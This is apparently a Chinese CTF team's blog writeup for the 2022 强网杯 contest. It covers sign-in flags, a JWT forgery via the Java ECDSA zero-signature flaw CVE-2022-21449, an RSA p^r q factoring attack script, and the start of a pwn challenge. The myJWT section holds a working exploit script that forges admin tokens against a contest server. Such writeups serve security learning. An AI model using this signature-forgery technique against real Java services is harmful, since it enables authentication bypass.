<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>强网杯部分WP | Ameuu</title><meta name="keywords" content="强网杯"><meta name="author" content="Ameuu,2421894564@qq.com"><meta name="copyright" content="Ameuu"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="强网杯">
<meta property="og:type" content="article">
<meta property="og:title" content="强网杯部分WP">
<meta property="og:url" content="http://example.com/2022/08/01/%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86WP/index.html">
<meta property="og:site_name" content="Ameuu">
<meta property="og:description" content="强网杯">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/cover3.jpg">
<meta property="article:published_time" content="2022-08-01T09:32:04.770Z">
<meta property="article:modified_time" content="2022-08-02T06:08:36.351Z">
<meta property="article:author" content="Ameuu">
<meta property="article:tag" content="强网杯">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/cover3.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2022/08/01/%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86WP/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: Ameuu","link":"链接: ","source":"来源: Ameuu","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '强网杯部分WP',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-08-02 14:08:36'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/NANAKI.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">29</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">29</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/cover3.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Ameuu</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">强网杯部分WP</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-08-01T09:32:04.770Z" title="发表于 2022-08-01 17:32:04">2022-08-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-08-02T06:08:36.351Z" title="更新于 2022-08-02 14:08:36">2022-08-02</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%8F%82%E5%8A%A0%E7%9A%84%E5%90%84%E7%A7%8D%E6%AF%94%E8%B5%9B/">参加的各种比赛</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="强网杯部分WP"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="TeamGipsy战队-WRITEUP"><a href="#TeamGipsy战队-WRITEUP" class="headerlink" title="TeamGipsy战队 WRITEUP"></a>TeamGipsy战队 WRITEUP</h1><h2 id="一、战队信息"><a href="#一、战队信息" class="headerlink" title="一、战队信息"></a>一、战队信息</h2><p>战队名称：TeamGipsy</p>
<p>战队排名：68</p>
<h2 id="二、解题情况"><a href="#二、解题情况" class="headerlink" title="二、解题情况"></a>二、解题情况</h2><p><img src="https://img-blog.csdnimg.cn/3c6fa2a5d5d14e8680253778754a0ec5.png" alt="image-20220801133145873"></p>
<h2 id="三、解题过程"><a href="#三、解题过程" class="headerlink" title="三、解题过程"></a>三、解题过程</h2><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;we1come_t0_qwb_s6&#125;</span><br></pre></td></tr></table></figure>

<h4 id="问卷调查"><a href="#问卷调查" class="headerlink" title="问卷调查"></a>问卷调查</h4><p>填写问卷得到flag</p>
<p><img src="https://img-blog.csdnimg.cn/e8db31248b1c40168688d442ae360a17.jpeg"></p>
<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="myJWT"><a href="#myJWT" class="headerlink" title="myJWT"></a>myJWT</h4><ul>
<li><p>考点：<a target="_blank" rel="noopener" href="https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/">CVE-2022-21449</a></p>
</li>
<li><p>运行环境</p>
<p>java11，下载fastjson的jar包，2.0以上的都报错了，所以选了<a target="_blank" rel="noopener" href="https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.9/">fastjson-1.2.9</a></p>
</li>
</ul>
<p>使用的是ECDSA，虽然是密码题，但并不是对ECDSA的签名、验证等步骤操作，这些都由java封装好了</p>
<p>所以是java的问题</p>
<p>由于代码中使用的格式是<code>SHA384withECDSAinP1363Format</code>，经过搜索是<a target="_blank" rel="noopener" href="https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/">CVE-2022-21449</a>，发现竟然是java没有判断$(r,s)$是否等于0。。。</p>
<p><img src="https://img-blog.csdnimg.cn/05611fb01eff4132b87cd27e592bc556.png" alt="image-20220731114449362"></p>
<p>此外这些都是不安全的</p>
<p><img src="https://img-blog.csdnimg.cn/6b983c541c0643a6b4d8069610f2d61f.png" alt="image-20220731114725609"></p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/">CVE-2022-21449</a></p>
<p>java没有判断$(r,s)$是否等于0会如何呢？其实在签名的时候一般都会确保$(r,s)$不为0的，但在验签的时候忽略了</p>
<p><img src="https://img-blog.csdnimg.cn/9e8bc038ab5d4ed4bd1a802e154834d8.png" alt="image-20220731120318947"></p>
<p>验签时计算<br>$$<br>r=x_P\notag<br>$$<br>而$P\equiv u_1G+u_2D\equiv s^{-1}zG+s^{-1}rD\equiv s^{-1}G(z+rd)\ (mod\ n)$</p>
<p>当然0的逆元是不存在的，但是看看java这里是怎么求逆元的</p>
<p><img src="https://img-blog.csdnimg.cn/41e002352e654d0fbec908cfbfbf9cb8.png" alt="image-20220731115417980"></p>
<p>相当于计算$x^{n-2}$，如果$x\ne0$，那么根据费马小定理（$n$为质数）<br>$$<br>x^{n-1}\equiv x\ (mod\ n)\notag<br>$$<br>那么<br>$$<br>x^{n-2}\equiv x^{-1}\ (mod\ n)\notag<br>$$<br>也就是说为了简化或者说提高效率，java使用费马小定理求逆元的，而且没有判断0，这样就造成了<br>$$<br>0^{n-2}\equiv 0\ (mod\ n)\notag<br>$$<br>$P\equiv 0\cdot G(z+rd)\ (mod\ n)\equiv 0\ (mod\ n)$</p>
<p>最终使得$r=x_P=0$验证通过</p>
</li>
<li><p>attack</p>
<p>这里如何实现将$r,s$都赋值为0？看CVE的demo是直接喂<code>\x00</code>的base64编码，不懂为什么，还没深究</p>
<p>exp如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;47.104.76.78&#x27;</span>, <span class="number">23334</span>)</span><br><span class="line"></span><br><span class="line">fake_sig = <span class="string">b&#x27;\x00\x00&#x27;</span></span><br><span class="line">name = <span class="string">b&#x27;4xwi11&#x27;</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;your name:&#x27;</span>, name)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">token = io.recvline().decode()[:-<span class="number">1</span>]</span><br><span class="line">head, payload, _ = token.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">payload = b64decode(payload).replace(<span class="string">b&#x27;false&#x27;</span>, <span class="string">b&#x27;true&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">payload_x = head.encode() + <span class="string">b&#x27;.&#x27;</span> + b64encode(payload) + <span class="string">b&#x27;.&#x27;</span> + b64encode(fake_sig)</span><br><span class="line">io.sendline(payload_x)</span><br><span class="line"><span class="built_in">print</span>(io.recvline()[:-<span class="number">1</span>])</span><br><span class="line"><span class="comment"># b&#x27;your token:flag&#123;cve-2022-21449_Secur1ty_0f_c0de_1mplementation&#125;&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>btw，不知道是不是jdk版本的问题，我本地不行</p>
<h4 id="Factor"><a href="#Factor" class="headerlink" title="Factor"></a>Factor</h4><p>就完全是这篇论文的复现了<a target="_blank" rel="noopener" href="https://eprint.iacr.org/2015/399.pdf">New attacks on RSA with Moduli N = p^rq</a>[6]</p>
<p>注意第一和第二种攻击中，用CopperSmith解小根就可以得到相应的未知数</p>
<p><img src="https://img-blog.csdnimg.cn/ba522a2cc8644ae2a0fbe23904048738.png" alt="image-20220731171326864"></p>
<p><img src="https://img-blog.csdnimg.cn/eb97a77a94d14b58a7cdb4bf369fcef2.png" alt="image-20220731171300864"></p>
<p>完整的exp如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># solve m1, m2</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_m1_m2</span>():</span></span><br><span class="line">    n11 = <span class="number">801049932940568005269978912396585741498810389425615966036828877784238116634177290247194019425111606811005728521368879065336038221361037062407029836155148874719789714345603547779284558101833801155509762818376470874215789574939002212274399950433269775325144015468620263028557804618774240232988157961712628677901130814703917513004114547234375629747176834581166306552311075522669403347828095831520693563291249869832390698646691647204371133362254846234990175138047928703289833460734235302093916147489509206061923877623300596194317059884824322527532662470348274079800781120104946546063500763852622187404608639542858285661288293918912184354236687975919510300221932074135531028314170475917110204254042336116619335841213418990605590620842511615815443114612333881430920769002933370887494558640833005339906706603497809846863863967391543647049224309556936909768179259581851520214669904560467640473144481633920438487615788689262961741053146610554997224861331949716721056553499531186695425439163222802917813140266513735841447717418846360096652592844940362932171019143434080184728093326143821165097895058935372215708948088248596585127475770021962501262915274497478428868130455122612016408381607561200802267038869516896665387576895570245272035575637</span></span><br><span class="line">    n12 = <span class="number">635401970340205725139325006504978344512744926958688031423448003992072769931808217486709574151492230879374574313457662436423263437792389711379687512056391117410807565492548718691166183372633151644917135272259770997096195518489056319350258673723095417922153182423913759272893696867426193704479752772511081457729513843682588951499551132432923147997238597538055902932123792252593514225328196541483451747314048080824405530742533473914329294346486691684904100406972073037050089861816604505650042953778360621934380815999541183067585498606053857125775979915077329566722531830089714823979965934190338538564188253271016367299890015449611141166780048763403252309160517164569110740561584100839212138661881615351382946813818078899882595313362934594951895560189003438775450675343590147821186953526262224973333962454561275321925151619178204499342339749637758100126893330994252902926509705617882239610380420830791088907378397226817514095468815228186716220057075095711894070032344613244803934541318573847029365563159918970404057137270884587905766828750387753130065274147902379993224780149663600462492281891320702134153853359393588902750423972068679293373333869389393970353760507436913233657422185531482023237384247535554666481760197851108297145147371</span></span><br><span class="line">    e11 = <span class="number">1898839980562048754607069073527844852132536432440793106124181406514770178066775988232362054809850074774981836898118651469424148725970708199461113088705044905633592578936333918328544505910996746428679299419879472444790941363558025887620570856598548320246426354974395765243741646121743413447132297230365355148066914830856904433750379114692122900723772114991199979638987571559860550883470977246459523068862898859694461427148626628283198896659337135438506574799585378178678790308410266713256003479022699264568844505977513537013529212961573269494683740987283682608189406719573301573662696753903050991812884192192569737274321828986847640839813424701894578472933385727757445011291134961124822612239865</span></span><br><span class="line">    e12 = <span class="number">1262647419018930022617189608995712260095623047273893811529510754596636390255564988827821761126917976430978175522450277907063247981106405519094560616378241247111698915199999363948015703788616554657275147338766805289909261129165025156078136718573006479030827585347458143645738353716189131209398056741864848486818076440355778886993462012533397208330925057305502653219173629466948635110352752162442552541812665607516753186595817376029707777599029040724727499952161261179707271814405907165207904499722122779096230563548011491932378429654764486855147873135769116637484240454596231092684424572258119768093562747249251518965380465994055049411715353547147466711949391814550591591830515262296556050946881</span></span><br><span class="line">    c11 = <span class="number">18979511327426975645936984732782737165217332092805655747550406443960209507493506811471688957217003792679188427155591583024966608843371190136274378868083075515877811693937328204553788450031542610082653080302874606750443090466407543829279067099563572849101374714795279414177737277837595409805721290786607138569322435729584574023597293220443351227559400618351504654781318871214405850541820427562291662456382362148698864044961814456827646881685994720468255382299912036854657082505810206237294593538092338544641919051145900715456411365065867357857347860000894624247098719102875782712030938806816332901861114078070638796157513248160442185781635520426230183818695937457557248160135402734489627723104008584934936245208116232179751448263136309595931691285743580695792601141363221346329077184688857290503770641398917586422369221744736905117499140140651493031622040723274355292502182795605723573863581253354922291984335841915632076694172921289489383700174864888664946302588049384130628381766560976143458735712162489811693014419190718601945154153130272620025118408017441490090252674737105557818759190934585829634273698371996797545908125156282869589331913665938038870431655063063535672001112420959158339261862052308986374193671007982914711432579</span></span><br><span class="line">    c12 = <span class="number">336587005671304527566745948355290412636261748969581976214239578621816863343117433524033533838636941679300497270909696775021031004312477997130741361709262822736904340641138652359632950455651920464042448022467664596484055174270895170499076347333381222768518599018520948098943626229061996126260154604038101543546588917619576702866444998578555907070990331574722135141778182631559802154493815687284077524469331290249057291163803290619701104007028836609832847351748020354798788508790258935718399783002069490123663345156902440501507117289747695510266461539019431610123351176227443612317037899257774045751487135646052309277098939919088029284437221840182769808850184827681307611389353392683707516141736067793897378911235819049432542758429901945202632117089595899280390575706266239252841152490534353760118231918190110043319877744119083811214707593122757409240645257409097436061825613686773916466122693168971062418046703969144004779270391320645495586024342668002497155358623795942692477164489475917351003149045087283510728981096449890130735055015075557614253867698702479920619299919816768972581273507837309179450374634916567083251630203067065663910073926990517108921490442919372774170201239734064819301693527366233007925670043499415100789027665</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> sub_fraction(n11, n12):</span><br><span class="line">        q11, q12 = _[<span class="number">0</span>], _[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> n11 % q11 == <span class="number">0</span> <span class="keyword">and</span> q12 != <span class="number">1</span>:</span><br><span class="line">            p11 = iroot(n11 // q11, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">            p12 = iroot(n12 // q12, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">assert</span> p11 ** <span class="number">2</span> * q11 == n11</span><br><span class="line">            <span class="keyword">assert</span> p12 ** <span class="number">2</span> * q12 == n12</span><br><span class="line">            phi1 = p11 * (p11 - <span class="number">1</span>) * (q11 - <span class="number">1</span>)</span><br><span class="line">            phi2 = p12 * (p12 - <span class="number">1</span>) * (q12 - <span class="number">1</span>)</span><br><span class="line">            d1 = invert(e11, phi1)</span><br><span class="line">            d2 = invert(e12, phi2)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">pow</span>(c11, d1, n11), <span class="built_in">pow</span>(c12, d2, n12)</span><br><span class="line"></span><br><span class="line"><span class="comment"># solve b</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_b</span>():</span></span><br><span class="line">    n2 = <span class="number">209798341155088334158217087474227805455138848036904381404809759100627849272231840321985747935471287990313456209656625928356468120896887536235496490078123448217785939608443507649096688546074968476040552137270080120417769906047001451239544719039212180059396791491281787790213953488743488306241516010351179070869410418232801398578982244984544906579574766534671056023774009163991804748763929626213884208260660722705479782932001102089367261720194650874553305179520889083170973755913964440175393646890791491057655226024046525748177999422035469428780228224800114202385209306803288475439775037067014297973202621118959024226798935588827359265962780792266516120013602384766460619793738405476219362508944225007365127768741191310079985425349292613888185378948854602285379329682053663283534930182589905986063348509703027498270111412063194971956202729807710253369312175636837558252924035002153389909587349043986253518050303628071319876207392440085675892353421232158925122721273720564784886530611286461575045181073744696415657043278123662980166364494583141297996445429477446442693717498789391918530672770193730629928408766563592081857706608049076318165712479742423149330311238462044666384622153280310696667586565906758451118241914402257039981388209</span></span><br><span class="line">    e2 = <span class="number">65537</span></span><br><span class="line">    c2 = <span class="number">18352572608055902550350386950073774530453857897248738030380007830701135570310622004368605208336922266513238134127496822199799761713782366178177809597137102612444147565578155260524747439899150012223027218489946124086276814899675563837669559795153349686434242738207425653079514376089070980797596457151965772460109519623572502109592612394316680202287712465721767341302234806130244551387296133051760893033194962691942040228545508895009195291106297581470066545991352668826197346830561010198417527057944507902143965634058848276017283478933675052993657822322866778994956205033704582047618324071045349072526540250707463112668579342537349567247810715604220690215313641329522674080146047291570752430231923566302463491877377617044768978997438596643458475128936850994934029476030136643053997549253792076260765459166618369864942681056864815996253315631930002738854235841120321870075261782250357506436825550088826469396508045912258303652912217151127280959435741419961721418428605515096160344688795655562889755165362006775317188009008288782691705879510655892181975003485714604340542378477388225736316682379616676770234557939471098919647053799313777248678455620231721202780830980063824003076308811540534492317719811588898727134190545533822501681653</span></span><br><span class="line">    m1, m2 = solve_m1_m2()</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n2))</span><br><span class="line">    f = m1 * m2 * x - (m2 - m1)</span><br><span class="line">    f = f.monic()</span><br><span class="line">    root = <span class="built_in">int</span>(f.small_roots(X=<span class="number">2</span> ^ <span class="number">1000</span>, beta=<span class="number">0.75</span>)[<span class="number">0</span>])</span><br><span class="line">    p2 = gcd(<span class="built_in">int</span>(f(root)), n2)</span><br><span class="line">    p2 = iroot(p2, <span class="number">6</span>)[<span class="number">0</span>]</span><br><span class="line">    q2 = n2 // (p2 ** <span class="number">7</span>)</span><br><span class="line">    phi2 = p2 ** <span class="number">6</span> * (p2 - <span class="number">1</span>) * (q2 - <span class="number">1</span>)</span><br><span class="line">    d2 = invert(e2, phi2)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(c2, d2, n2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># solve flag</span></span><br><span class="line">n3 = <span class="number">539779851369541956878655738599584730199799866957191805784596190682932284216781781433367450841202917758999300635019369629627621029957135109806205877317954671312041249493462048283611940752235036153024920172209763260723728345918562258401803973624430150143563078517485996070862532682695228590709019451174548520135142052216785774589096706631010293690859363524584240662502290912412366366114571976050857239915691266377257797199583543940504695517331512813468837128344612227973709974625418257243011036826241599265375741977853552204640800449679679351666009764297016524814036295707311913711955324055690490892097177271718850857268982130811714517356073266905474635370690445031512184247179039751734276906533177939993769044135143389748416635981226449566039039202521305851567296884751935162651063209779647359922622084851547605090230221057349511482738300221222563908357379545905837110168948295030747460300104202323692732549831403834387939156877086852393515817984772384147449841124275061609701453997579569931391166586163299940486204581696722731952467570857217406030804590055255431828403195798003509083922294733709507134156466158642941338493323430671502043066148246348074878064089651235355282144209668143249348243220714471988019011613749340243917652821</span></span><br><span class="line">e3 = <span class="number">8179300978753084587812861894047395225516049110376948812109811319430275614612773726672345893359691900281432484382670047044697374818043512731533402576374645405477207239801498428774783768163880078495448747421425078521981578408638790336528372019271073712013371141939808017049399434858687299480461753638164719404612128939787055797762174745092074547412183349192156638711750872083313795551439465507724807626674514935170104573715458782366469587138508845980490673890245713729782917089910271980557159592807350504157192913530007199510144004848020221181558472160543018733124225266127379373751910439604459368078652499029070936707349862139053913745186413782066470461478961703013591655136140060879250067379283913798867648758171004535775565306842444545755351202796833177560656564652632975685912935281581268141803696686952259539945588609591385807620108279333498170028167338690235117003515264281843953984997958878272347778561933726792473981855755454522886321669676790813189668084373153897754540290867346751033567500922477317530445967753955221454744946208555394588111484610700789566547507402309549957740815535069057837915204852490930168843605732632328017129154852857227895362549146737618906180651623216848500491438142456250653458053922622240299736136335179639180898730269690699965799644757774472147210271111150769048976871249731156387939260749192370361488285775377622944817570292095201906142567403539151179209316853493906909989301225903409448461436855145</span></span><br><span class="line">c3 = <span class="number">113097822337683973761068913398570777162211043704088253732500045618770280334319497174908657828372816818344430304314992760410247741225285170975119344962728883084314382093407445567724674775086423808679124143380073906159023182353116556175251427048715466914368972746661938211846262612414049036821553068430149530397389927209475908905748728402722287875974303298260579839357610962198145974153609818939841880084892796820949226354126424023144300953584658958900737493704530725894948802258740332090822797815745616247879170037794873059391625680745994045522420168248552864215035136318711240256011217929372430302003068882829637056296413462078222453765071094277727760527662423010417144554652783429899139309180017349156600053882338180319473460877576898373222480215735280046214925463242092830060830764299787309912687294672319845054775281463150375545716818434962456139485501224661520991156961587158843064393883274763714930309353593180897123378717852182761518709151878662808890356934477932099818218743384674756674800089177733447066489275506387382342429495897972218764782517198727316942685748481956118012927027254979181519862451112593068440686462293151078537886822555211870303467014484443432209106264020502334805536091587252238173816637270028678636848763</span></span><br><span class="line">b = solve_b()</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n3))</span><br><span class="line">f = e3 * x - <span class="built_in">int</span>(b)</span><br><span class="line">f = f.monic()</span><br><span class="line">root = <span class="built_in">int</span>(f.small_roots(X=<span class="number">2</span> ^ <span class="number">675</span>, beta=<span class="number">0.75</span>)[<span class="number">0</span>])</span><br><span class="line">p3 = gcd(<span class="built_in">int</span>(f(root)), n3)</span><br><span class="line">p3 = iroot(p3, <span class="number">6</span>)[<span class="number">0</span>]</span><br><span class="line">q3 = n3 // p3 ** <span class="number">7</span></span><br><span class="line">phi3 = p3 ** <span class="number">6</span> * (p3 - <span class="number">1</span>) * (q3 - <span class="number">1</span>)</span><br><span class="line">d3 = invert(e3, phi3)</span><br><span class="line">m = <span class="built_in">pow</span>(c3, d3, n3)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># qwb&#123;8633ce6d-fece-4cf1-8f0f-f27e5bf6d678&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><h4 id="houseofcat"><a href="#houseofcat" class="headerlink" title="houseofcat"></a>houseofcat</h4><ul>
<li>首先逆向进入程序主逻辑先LOGIN |LOGIN r00t QWB QWXFadmin\x00 然后再CAT |LOGIN r00t QWB QWXF$\xff\xff\xff\xff 就能进入菜单</li>
